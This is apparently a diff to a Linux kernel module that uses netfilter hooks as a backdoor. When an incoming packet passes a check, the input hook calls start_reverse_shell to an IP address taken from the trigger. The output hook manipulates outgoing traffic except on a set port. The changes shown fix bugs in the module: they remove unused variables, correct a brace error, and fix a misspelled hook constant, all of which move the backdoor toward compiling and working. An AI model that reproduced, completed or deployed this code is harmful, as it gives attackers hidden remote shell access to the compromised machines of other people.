@@ -74,8 +74,6 @@ static unsigned int my_nf_hookIn(void *priv,
             start_reverse_shell(revIP, PORT);
             printk(KERN_INFO "successful compare and %s\n", revIP);
 
-            shSpawned = 1;
-
             kfree(revIP);
             return NF_DROP;
         }
@@ -94,13 +92,9 @@ static unsigned int my_nf_hookOut(void *priv,
     struct iphdr *ip_header;        //ip header
     struct tcphdr *tcp_header;      //tcp header
     struct sk_buff *sock_buff = skb;//sock buffer
-    char *user_data;       //data header pointer
     //Auxiliar
-    int size;                       //payload size
-    char* _data;
     struct tcphdr _tcphdr;
     struct iphdr _iph;
-    char ip_source[16];
 
     if (!sock_buff){
         return NF_ACCEPT; //socket buffer empty
@@ -120,7 +114,8 @@ static unsigned int my_nf_hookOut(void *priv,
         if(dport == nPORT){
             return NF_ACCEPT; 
         }
-        return NF_QUEUE;
+    }
+    return NF_QUEUE;
 }
 
 struct nf_hook_ops my_nfin = {
@@ -132,7 +127,7 @@ struct nf_hook_ops my_nfin = {
 
 struct nf_hook_ops my_nfout = {
       .hook        = my_nf_hookOut,
-      .hooknum     = NF_INIT_LOCAL_OUT,
+      .hooknum     = NF_INET_LOCAL_OUT,
       .pf          = PF_INET,
       .priority    = NF_IP_PRI_FIRST
 };
